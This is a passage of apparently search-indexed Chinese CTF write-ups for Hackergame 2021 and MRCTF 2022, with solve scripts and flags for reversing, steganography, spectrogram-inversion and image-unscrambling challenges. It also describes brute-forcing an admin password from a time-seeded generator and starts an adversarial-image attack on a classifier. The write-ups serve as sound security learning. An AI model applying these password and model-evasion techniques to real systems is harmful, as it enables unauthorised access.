\uff0c\u6240\u4ee5\u63a8\u6d4b\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u5c31\u662f\u5c06\u8fd9\u4e2a\u5217\u8868\u5faa\u73af\u53f3\u79fb\u4e24\u4e2a\u4f4d\u7f6e \u90a3\u8fd9\u4e2a\u533f\u540d\u51fd\u6570\u4e5f\u4e0d\u7528\u770b\u4e86 \u518d\u6765\u770b _0x2c9e() \u8fd9\u4e2a\u51fd\u6570\uff1a function _0x2c9e ( _0x49e6ff , _0x310d40 ) { const _0x381b4c = _0x381b (); return _0x2c9e = function ( _0x2c9ec6 , _0x2ec3bd ) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; let _0x4769df = _0x381b4c [ _0x2c9ec6 ]; return _0x4769df ; } , _0x2c9e ( _0x49e6ff , _0x310d40 ); } \u5176\u4e2d _0x381b4c \u662f\u521a\u521a\u8bf4\u7684\u90a3\u4e2a\u5217\u8868 lst\u3002\u7136\u540e return \u91cc\u9762\u91cd\u65b0\u5b9a\u4e49\u4e86 _0x2c9e \uff0c\u4f46\u662f\u65b0\u7684\u5b9a\u4e49\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5e76\u6ca1\u6709\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd4\u56de\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u5c31\u76f8\u5f53\u4e8e\uff1a function _0x2c9e ( _0x2c9ec6 , ...) { _0x2c9ec6 = _0x2c9ec6 - 0x1a6 ; return lst [ _0x2c9ec6 ]; } 0x1a6 \u662f 422\uff0c\u6240\u4ee5\u6574\u4e2a\u51fd\u6570\u4e5f\u5c31\u76f8\u5f53\u4e8e function(x) { return lst[x - 422]; } \u540c\u65f6\u6839\u636e\u7b2c\u4e00\u884c\uff0c\u7a0b\u5e8f\u4e2d\u6240\u6709 _0x22517d \u4e5f\u662f\u8fd9\u4e2a\u51fd\u6570 \u7136\u540e\u770b\u5224\u65ad\u7b54\u6848\u7684 gyflagh \u51fd\u6570 function gyflagh ( _0x111955 ) { const _0x50051f = _0x22517d ; let _0x3b790d = _0x111955 [ _0x50051f ( 0x1a8 )]( _0x50051f ( 0x1b7 )); if ( _0x3b790d === _0x50051f ( 0x1aa )) return !! []; return ! []; } \u6ca1\u5565\u7279\u522b\u7684\uff0c\u7ed3\u5408 lst \u53ef\u4ee5\u5f97\u5230\uff1a function gyflagh ( ans ) { if ( ans [ \"encrypt\" ]( \"1356853149054377\" ) === \"6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c\" ) { return true ; } return false ; } \u7136\u540e\u5c31\u53ef\u4ee5\u7ed3\u5408 lst \u4e2d\u7684\u503c\u548c\u7d22\u5f15\uff0c\u7ffb\u8bd1\u51fa\u6700\u91cd\u8981\u7684\u51fd\u6570 \u518d\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\uff0c\u7528\u6ce8\u91ca\u6807\u6ce8\u4e00\u4e0b\u5df2\u77e5\u7684\u503c\u5c31\u53ef\u4ee5\u5f97\u5230\uff1a String [ \"prototype\" ][ \"encrypt\" ] = function ( key ) { // key = \"1356853149054377\" const left = new Array ( 2 ); const right = new Array ( 4 ); let res = \"\" ; ans = escape ( this ); // this := ans right = [ 909456177 , 825439544 , 892352820 , 926364468 ] for ( var i = 0 ; i < ans [ \"length\" ]; i = i + 8 ) { left [ 0 ] = Str4ToLong ( ans [ \"slice\" ]( i , i + 4 )); left [ 1 ] = Str4ToLong ( ans [ \"slice\" ]( i + 4 , i + 8 )); code ( left , right ); res = res + ( LongToBase16 ( left [ 0 ]) + LongToBase16 ( left [ 1 ])); } return res ; // 6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c }; \u518d\u6765\u770b code \u51fd\u6570\uff0c\u6839\u636e << 4\u3001 ^\u3001 >>> 5 \u53ef\u4ee5\u5927\u80c6\u63a8\u6d4b\u7c7b\u4f3c TEA\uff0c\u7136\u540e\u89e3\u7801\u5c31\u76f4\u63a5\u7ffb\u8fc7\u6765\u5c31\u597d\u4e86\uff1a function dec ( left , right ) { for ( var i = 2654435769 * 32 ; i != 0 ;) { left [ 1 ] -= (( left [ 0 ] << 4 ^ left [ 0 ] >>> 5 ) + left [ 0 ] ^ i + right [ i >>> 11 & 3 ]); i -= 2654435769 ; left [ 0 ] -= (( left [ 1 ] << 4 ^ left [ 1 ] >>> 5 ) + left [ 1 ] ^ i + right [ i & 3 ]); } console . log ( left ); } \u6700\u540e\u628a\u8981\u5f97\u5230\u7684 res \u5206\u5757\uff0c\u6bcf 8 \u4e2a\u4e00\u7ec4\uff1a 6fbde674 819a59bf a1209256 5b4ca2a7 a11dc670 c678681d af4afb67 04b82f0c \u7136\u540e\u4ece\u540e\u5f80\u524d\uff0c\u6bcf\u4e24\u4e2a\u6267\u884c Base16ToLong\uff0c\u7136\u540e\u4f5c\u4e3a left \u4f20\u7ed9 dec \u51fd\u6570\u89e3\u7801\uff0c\u7136\u540e\u518d LongToStr4 \u5f97\u5230\u56db\u4e2a\u5b57\u7b26: \u62fc\u8d77\u6765\u5c31\u662f flag \u4e86\uff1a flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}","title":"minecRaft"},{"location":"writeups/hackergame2021/#_13","text":"\u5c0f T \u6700\u8fd1\u53c8\u5199\u4e86\u4e00\u4e2a web \u5e94\u7528\u3002 \u4ed6\u53d1\u73b0\u5f88\u591a\u7528\u6237\u90fd\u559c\u6b22\u8bbe\u7f6e\u5f31\u5bc6\u7801\uff0c\u4e8e\u662f\u51b3\u5b9a\u8ba9\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u90fd\u5fc5\u987b\u662f 16 \u4f4d\u957f\uff0c\u5e76\u4e14\u5404\u79cd\u7b26\u53f7\u90fd\u8981\u6709\u3002\u4e3a\u4e86\u8ba9\u5927\u5bb6\u53ef\u4ee5\u65b9\u4fbf\u751f\u6210\u8fd9\u6837\u7684\u5bc6\u7801\uff0c\u4ed6\u8fd8\u5199\u4e86\u4e00\u4e2a\u5bc6\u7801\u751f\u6210\u5668\uff0c\u8ba9\u7528\u6237\u53ef\u4ee5\u751f\u6210\u7b26\u5408\u89c4\u5219\u7684\u5bc6\u7801\u3002 \u4f46\u8fd9\u6837\u679c\u771f\u5b89\u5168\u5417\uff1f \uff08\u611f\u89c9\u8fd9\u6b21 Hackergame \u9898\u7684 tag \u90fd\u5f88\u8be1\u5f02\u3002\u8fd9\u9898\u660e\u660e\u662f misc(general) \u4e3a\u4ec0\u4e48\u6253\u4e86 binary \u7684 tag\uff09 \u770b\u5230 binary tag \u76f4\u63a5\u5148\u5f80 IDA \u91cc\u9762\u4e22\uff0c\u7136\u540e\u62a5\u9519\u4e86\uff0c\u5927\u6982\u662f\u56e0\u4e3a\u90e8\u5206 winapi \u5bfc\u5165\u4e0d\u8fdb\u53bb\u7684\u95ee\u9898\uff08\uff1f\uff09 \u7136\u540e\u5c31\u4e0d\u4f1a\u4e86\u2026\u2026 \u5bf9\u7740 IDA \u5e72\u77aa\u773c \u770b\u9898\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u7f51\u7ad9\uff0c\u7528\u6765\u53d1\u5e03\u5c55\u677f\uff0c\u770b\u8d77\u6765\u53ea\u6709 admin \u7528\u6237\uff0c\u800c\u4e14\u6ca1\u6709\u6ce8\u518c\u7cfb\u7edf\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u662f\u8981\u641e\u5230 admin \u7684\u5bc6\u7801\u4e86 \u518d\u7ec6\u770b\u7f51\u7ad9\uff0c\u7279\u610f\u63d0\u5230 \u201c\u7f51\u9875\u663e\u793a \u65f6\u95f4 \u201d\uff0c\u800c\u4e14\u5c55\u677f\u540e\u9762\u90fd\u6709\u53d1\u5e03\u65f6\u95f4\uff0c\u70b9\u8fdb admin \u7684\u7528\u6237\u9875\u9762\u53d1\u73b0\u4e5f\u6709\u6ce8\u518c\u65f6\u95f4\uff0c\u7740\u5b9e\u6709\u4e9b\u8bb8\u8be1\u5f02\uff08 \u6240\u4ee5\u65f6\u95f4\u5e94\u8be5\u662f\u4e00\u4e2a\u63d0\u793a \u800c\u5199\u4ee3\u7801\u7684\u65f6\u5019\u8bbe\u7f6e\u968f\u673a\u6570\u79cd\u5b50\u53c8\u5e38\u4ee5\u5f53\u524d\u65f6\u95f4\u4f5c\u4e3a\u79cd\u5b50\uff0c\u6240\u4ee5\u751f\u6210\u7684\u5bc6\u7801\u53ef\u80fd\u662f\u548c\u65f6\u95f4\u6709\u5173\u7cfb\u7684 \u901a\u8fc7\u8c03\u7cfb\u7edf\u65f6\u95f4\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u540c\u4e00\u79d2\u70b9\u4e0b\u751f\u6210\uff0c\u4ea7\u751f\u7684\u5bc6\u7801\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u53ea\u9700\u8981\u628a\u7cfb\u7edf\u65f6\u95f4\u8c03\u5230 admin \u7684\u6ce8\u518c\u65f6\u95f4\u5de6\u53f3\uff0c\u7136\u540e\u6bcf\u79d2\u751f\u6210\u5bc6\u7801\uff0c\u518d\u6328\u4e2a\u8f93\u8fdb\u53bb\u7206\u7834\u5373\u53ef \u6700\u540e\u5f97\u5230 2021-09-22 23:10:53 \u65f6\u751f\u6210\u7684\u5bc6\u7801 $Z=CBDL7TjHu~mEX \u5c31\u662f admin \u7684\u5bc6\u7801 \u7136\u540e\u767b\u5f55\u5373\u53ef\u5728\u201c\u6211\u7684\u201d\u91cc\u770b\u5230\u4e00\u6761\u79c1\u5bc6\u5c55\u677f\uff0c\u5185\u5bb9\u662f flag","title":"\u5bc6\u7801\u751f\u6210\u5668"},{"location":"writeups/hackergame2021/#pq","text":"\u5b66\u4f1a\u5085\u91cc\u53f6\u7684\u4e00\u77ac\u95f4\uff0c\u6094\u6068\u7684\u6cea\u6c34\u6d41\u4e86\u4e0b\u6765\u3002 \u5f53\u6211\u770b\u5230\u97f3\u9891\u64ad\u653e\u5668\u4e2d\u8df3\u52a8\u7684\u9891\u8c31\u52a8\u753b\uff0c\u6708\u660e\u661f\u7a00\u7684\u591c\u665a\uff0c\u6df1\u9083\u7684\u94f6\u6cb3\uff0c\u53ea\u6709\u5929\u4f7f\u5728\u6d45\u541f\u4f4e\u5531\uff0c\u590d\u6742\u7684\u60c5\u611f\u4e8e\u6211\u773c\u4e2d\u6ea2\u51fa\uff0c\u50cf\u662f\u6c89\u5165\u4e86\u96fe\u91cc\u6726\u80e7\u7684\u6d77\u4e00\u6837\u7684\u6e29\u67d4\u3002 \u8fd9\u4e00\u523b\u6211\u624d\u77e5\u9053\uff0c\u8033\u673a\u97f3\u54cd\u4e5f\u5c31\u56fe\u4e00\u4e50\uff0c\u771f\u542c\u97f3\u4e50\u8fd8\u5f97\u9760\u773c\u775b\u3002 \uff08\u6ce8\u610f\uff1aflag \u82b1\u62ec\u53f7\u5185\u662f\u4e00\u4e2a 12 \u4f4d\u6574\u6570\uff0c\u7531 0-9 \u6570\u4f4d\u7ec4\u6210\uff0c\u6ca1\u6709\u5176\u5b83\u5b57\u7b26\u3002\uff09 \u867d\u7136\u8fd9\u9898\u662f\u5728\u5012\u6570\u7b2c\u4e09\u9898\uff0c\u8fd8\u503c 400pt\uff0c \u4f46\u4f60\u4e00\u8bf4\u5085\u91cc\u53f6\u6211\u53ef\u5c31\u4e0d\u56f0\u4e86\u55f7 \u4e0b\u8f7d\u9898\u76ee\u5305\uff0c\u6709\u4e00\u4e2a\u751f\u6210 gif \u7684 py \u4ee3\u7801\u548c\u90a3\u4e2a gif \u6587\u4ef6 \u6b63\u597d\u524d\u9762\u7684\u7535\u6ce2\u4e5f\u6709\u4e00\u6bb5\u97f3\u9891\uff0c\u53ef\u4ee5\u7528\u90a3\u4e2a\u5e26\u5165\u5230 generate_sound_visualization.py \u4e2d\u751f\u6210\u4e00\u4e2a gif\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u6765\u6d4b\u8bd5 \u518d\u4ed4\u7ec6\u770b\u4e00\u770b generate_sound_visualization.py \u8fd9\u4e2a\u6587\u4ef6 \u4e3b\u8981\u4f7f\u7528\u4e86 librosa \uff0c\u4e8e\u662f\u5c31\u53ef\u4ee5\u7ffb \u6587\u6863 \u6765\u770b\u61c2\u8fd9\u4e2a\u7a0b\u5e8f\uff1a y , sample_rate = librosa . load ( \"flag.mp3\" ) # \u4ecemp3\u4e2d\u8bfb\u53d6\u6570\u636e\u548c\u91c7\u6837\u7387 spectrogram = numpy . around ( # \u56db\u820d\u4e94\u5165\uff0c\u4f46\u4f1a\u9020\u6210\u9006\u5411\u7684\u65f6\u5019\u6709\u5c11\u8bb8\u8bef\u5dee\u5bfc\u81f4\u6742\u97f3 librosa . power_to_db ( # \u628a\u4ee5\u529f\u7387\u4e3a\u5355\u4f4d\u7684\u9891\u8c31\u56fe\u8f6c\u6362\u4e3a\u4ee5\u5206\u8d1d\u4e3a\u5355\u4f4d librosa . feature . melspectrogram ( # \u901a\u8fc7\u97f3\u9891\u6570\u636e\u548c\u91c7\u6837\u7387\u8ba1\u7b97\u6885\u5c14\u9891\u8c31 y , sample_rate , n_mels = num_freqs , n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type ) ) / quantize # \u9664\u4ee52 ) * quantize # \u4e58\u4ee52 \u7136\u540e\u53c8\u901a\u8fc7\u4e00\u4e9b numpy \u7684\u9a9a\u64cd\u4f5c\u6765\u751f\u6210\u6bcf\u4e00\u5e27\u7684\u6570\u636e\uff0c\u7136\u540e\u901a\u8fc7 array2gif \u5305\u7684 write_gif \u51fd\u6570\u6765\u751f\u6210 gif \u6240\u4ee5\u4e3b\u8981\u601d\u8def\u5c31\u662f\u628a\u6574\u4e2a\u7a0b\u5e8f \u5b8c\u6574\u5730\u9006\u8fc7\u6765 \u7531\u4e8e\u5fc5\u5e94\u6ca1\u6709\u67e5\u5230 gif2array \u7684\u5305\uff0c\u6240\u4ee5\u8bfb\u53d6 gif \u5c31\u7528\u4e86\u7ecf\u5178 PIL.Image \uff1a from PIL import Image file = Image . open ( \"flag.gif\" ) try : while True : gif_data . append ( np . array ( file )) file . seek ( file . tell () + 1 ) except : print ( \"[+] Read gif file\" ) \u7136\u540e\u662f\u89e3\u51b3\u90a3\u4e00\u5927\u6bb5 numpy \u9a9a\u64cd\u4f5c\u7684\u9006\u9a9a\u64cd\u4f5c\uff08 \u4f46\u662f\u6570\u7406\u57fa\u7840\u8fd9\u4e48\u5dee\u7684\u6211\u5f53\u7136\u662f\u4e0d\u60f3\u4ed4\u7ec6\u7814\u7a76\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u7528\u7535\u6ce2\u90a3\u9898\u7684 radio.mp3 \u5e26\u5165\uff0c\u770b\u4e00\u770b\u8981\u5f97\u5230\u7684 spectrogram \u662f\u4ec0\u4e48\u6837\u5b50 \u8f93\u51fa\u5f97\u5230\u7684 spectrogram \u662f\uff1a [[ - 58. - 48. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 26. ... - 58. - 58. - 58. ] [ - 58. - 40. - 16. ... - 58. - 58. - 58. ] ... [ - 58. - 42. - 30. ... - 58. - 58. - 58. ] [ - 58. - 44. - 32. ... - 58. - 58. - 58. ] [ - 58. - 46. - 34. ... - 58. - 58. - 58. ]] \u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a [[ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 48. - 44. - 40. ... - 42. - 44. - 46. ] [ - 30. - 26. - 16. ... - 30. - 32. - 34. ] ... [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ]] \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e \u518d\u7ed3\u5408\u6e90\u7801\uff1a numpy . array ([ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ]) \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a spectrogramT = [] for data in gif_data : res = [] for ind , line in enumerate ( data . transpose ()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97 num = sum ( line ) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09 if ind % 4 == 3 : res . append ( num + min_db ) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9 spectrogramT . append ( res ) spectrogram = np . array ( spectrogramT ) . transpose () # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b \u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 power_to_db \u5f53\u7136\u4e5f\u5c31\u6709 db_to_power \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 librosa.feature.inverse.mel_to_audio \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a y = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86 sample_rate , n_iter = num_freqs , # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type , ) \u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 soundfile \uff1a import soundfile as sf sf . write ( \"flag.wav\" , y , sample_rate ) \u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86","title":"p\ud83d\ude2dq"},{"location":"writeups/hackergame2021/#reference","text":"Hackergame \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e LUG@USTC \u5b98\u7f51 Wayback Machine archive.org SIGBOVIK 2021 \u767e\u5ea6\u5168\u666f\u5730\u56fe \u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed GraphQL\u5b98\u7f51 \u3001 GraphiQL \u3001 GraphQL Voyager \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e librosa\u6587\u6863 PySoundFile\u6587\u6863 Wilson's theorem - wikipedia BUU-RSA [RoarCTF2019]babyRSA - CSDN Euler's totient function - wikipedia LUKS2 doc pdf 10 Linux cryptsetup Examples for LUKS Key Management pyinstxtractor uncompyle6","title":"Reference"},{"location":"writeups/mrctf2022/","text":"MRCTF 2022 Writeup \u00b6 Abstract \u53d7\u9ad8\u4e2d\u5b66\u957f\u9080\u8bf7\u6765\u6253\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u8d28\u91cf\u5f88\u9ad8\uff0c\u6253\u7684\u5f88\u723d\uff0c\u961f\u91cc\u5927\u624b\u5b50\u5f3a\u7684\u5f88\uff0c\u5e26\u7740\u62ff\u4e86\u7b2c\u4e00 misc \u6709\u4e00\u9053\u9898\u6ca1\u505a\u51fa\u6765\uff0c\u770b\u4e86 nano \u7684 wp \u540e\u8865\u51fa\u6765\u4e86\uff0c\u8fd9\u6b21\u6bd4\u8d5b\u4e5f\u53c2\u4e0e\u4e86\u4e00\u4e0b eth \u9898\u76ee ReadLongNovel \u00b6 \u7531\u4e8e\u65f6\u95f4\u591f\u957f\u3001\u9898\u5e93\u4e0d\u5927\uff0c\u6240\u4ee5\u76f4\u63a5\u7f51\u7edc\u641c\u7d22 + \u539f\u6587 txt \u641c\u7d22\u5c31\u53ef\u4ee5\u624b\u52a8\u641e\u5dee\u4e0d\u591a flag: MRCTF{\u613f\u60a8\u7684+\u6587\u660e+\u6c38\u8fdc\u8fdb\u6b65} Connecting... \u00b6 obj \u6709\u4e2a\u6570\u636e\u4e0d\u6539\u7684\u8bdd blender \u52a0\u8f7d\u4e0d\u51fa\u6765\uff084d33 \u4e0d\u662f\u5341\u8fdb\u5236\u6570\uff09 \u7136\u540e\u53d1\u73b0\u6240\u6709 f \u90fd\u662f / \u5206\u9694\u7684\u4e09\u4e2a\u6570\u76f8\u540c\uff0c\u53ea\u6709\u8fd9\u4e00\u884c\u4e0d\u76f8\u540c >>> for each in [ 0x4d , 0x33 , 0x52 , 0x37 , 0x61 , 0x49 , 0x63 , 0x54 , 0x46 ]: ... print ( chr ( each ), end = \"\" ) ... M3R7aIcTF \u56fe\u7247\u5f00\u5934 xml \u4fe1\u606f\u4e2d\u53d1\u73b0\uff1aThank Fabien Petitcolas For his work. \u641c\u5230 mp3stego\uff0c\u7528\u5b83\u548c\u5bc6\u7801 M3R7aIcTF \u6765\u89e3\u5bc6 wav \u6587\u4ef6\uff08\u5176\u5b9e\u662f mp3\uff09\u5f97\u5230\uff1a FBGTGURXMFEWGVCGFEWSAKZAFVGVEQ2UIZ5VOSKGJFPTEMBSGJPWG33ONZSWG5C7ON2WGY3FONZWM5LMNR4SC7I base32\uff1a (M3R7aIcTF)- + -MRCTF{WIFI_2022_connect_successfully!} flag: MRCTF{WIFI_2022_connect_successfully!} Pixel \u00b6 blue plane \u770b\u8d77\u6765\u5f88\u6709\u95ee\u9898\uff0c\u628a 512 \u5f20\u56fe\u7247\u7684\u6240\u6709\u70b9\u70b9\u53e0\u52a0\uff08blue \u5404\u4e2a plane \u90fd\u5dee\u4e0d\u591a\uff0c\u8fd9\u4e2a\u662f blue 3\uff09 \u518d\u6839\u636e hint \u76f4\u63a5\u641e\u5230\u539f\u56fe\uff1a img2 = Image . new ( \"RGB\" , ( 512 , 512 )) for i in range ( 512 ): for j in range ( 512 ): img2 . putpixel (( i , j ), ( 255 , 255 , 255 )) for n in tqdm ( range ( 512 )): img = Image . open ( f \"pixel/ { n } .png\" ) width , height = img . size for i in range ( width ): for j in range ( height ): R , G , B = pix = img . getpixel (( i , j )) if B != 255 : img2 . putpixel (( i , j ), pix ) img2 . save ( f \"zigzag.png\" ) red plane 0 \u6709\u95ee\u9898 \u6839\u636e zigzag \u63a8\u6d4b\u9700\u8981\u8fdb\u884c\u4e00\u4e9b zigzag \u64cd\u4f5c\uff08\u5373\u50cf\u7d20\u70b9\u987a\u5e8f\u7684\u8f6c\u6362\uff09\u7f51\u4e0a\u627e\u627e\u4ee3\u7801\u6539\u4e00\u6539 zigzag from PIL import Image import numpy as np def zigzag ( data ): row = data . shape [ 0 ] col = data . shape [ 1 ] num = row * col lst = np . zeros ( num ,) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ k ] = data . item ( i , j ) k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def dezigzag ( data ): num = len ( data ) row = int ( num ** 0.5 ) col = int ( num ** 0.5 ) lst = np . zeros (( row , col )) k = 0 i = 0 j = 0 while i < row and j < col and k < num : lst [ i ][ j ] = data [ k ] k = k + 1 if ( i + j ) % 2 == 0 : if ( i - 1 ) in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) in range ( col ): j = j + 1 elif ( i - 1 ) not in range ( row ) and ( j + 1 ) not in range ( col ): i = i + 1 else : i = i - 1 j = j + 1 elif ( i + j ) % 2 == 1 : if ( i + 1 ) in range ( row ) and ( j - 1 ) not in range ( col ): i = i + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) in range ( col ): j = j + 1 elif ( i + 1 ) not in range ( row ) and ( j - 1 ) not in range ( col ): j = j + 1 else : i = i + 1 j = j - 1 return lst def ZigZag ( data ): lst = zigzag ( data ) k = 0 ret = np . zeros ( data . shape ) row , col = data . shape for i in range ( row ): for j in range ( col ): ret [ i ][ j ] = lst [ k ] k += 1 return ret def deZigZag ( data ): lst = [] row , col = data . shape for i in range ( row ): for j in range ( col ): lst . append ( data [ i ][ j ]) ret = dezigzag ( lst ) return ret img = Image . open ( \"XXX\" ) . convert ( \"L\" ) arr = np . array ( img ) #for i in range(64): #for j in range(64): # arr[8*i:8*i+8, 8*j:8*j+8] = ZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) #arr[8*i:8*i+8, 8*j:8*j+8] = deZigZag(arr[8*i:8*i+8, 8*j:8*j+8]) arr [ 0 : 512 , 0 : 512 ] = deZigZag ( arr [ 0 : 512 , 0 : 512 ]) img2 = Image . fromarray ( arr , \"L\" ) img2 . show () img2 . save ( \"XXX\" ) \u660e\u663e\u662f\u732b\u56fe\u7b97\u6cd5\uff0c\u53c2\u6570 20 22 cat map import os from PIL.Image import open as load_pic , new as new_pic def main ( path , iterations , keep_all = False , name = XXX ): title = os . path . splitext ( os . path . split ( path )[ 1 ])[ 0 ] ppath = path counter = 0 while counter < iterations : with load_pic ( path ) as image : dim = width , height = image . size with new_pic ( image . mode , dim ) as canvas : for x in range ( width ): for y in range ( height ): nx = ( 441 * x + 20 * y ) % width ny = ( 22 * x + 1 * y ) % height canvas . putpixel (( nx , height - ny - 1 ), image . getpixel (( x , height - y - 1 ))) if counter > 0 and not keep_all : os . remove ( path ) counter += 1 print ( counter , end = \" \\r \" ) path = name . format ( name = title , index = counter ) canvas . save ( path ) return canvas result = main ( XXX , 512 , True ) result . show () flag: MRCTF{f8e49887132bf8977a161472781b718c} Spy_Dog \u00b6 \u8981\u6c4299.9%\u7684\u6982\u7387\u8bc6\u522b\u6210\u732b\u3002 \u7528\u68af\u5ea6\u53cd\u5411\u4f20\u64ad\u8bad\u7ec3\u7f51\u7edc\u53c2\u6570\u7684\u65b9\u5f0f\u8bad\u7ec3\u56fe\u7247\u5373\u53ef\uff0c\u4ee3\u7801\u76f4\u63a5\u6284\u7f51\u4e0a\u7684\uff1a https://www.likecs.com/show-915984.html \u7531\u4e8e\u53d6\u6574\u5e26\u6765\u7684\u95ee\u9898\uff0c\u8bad\u7ec3\u5f97\u5230\u7684\u51c6\u786e\u7387\u8981\u6bd4\u8981\u6c42\u9ad8\u4e00\u70b9 exp # %% from keras.models import load_model import cv2 import numpy as np from keras.preprocessing import image from keras.applications import inception_v3 from keras import backend as K from PIL import Image import tensorflow as tf tf . compat . v1 . disable_eager_execution () # %% model = load_model ( 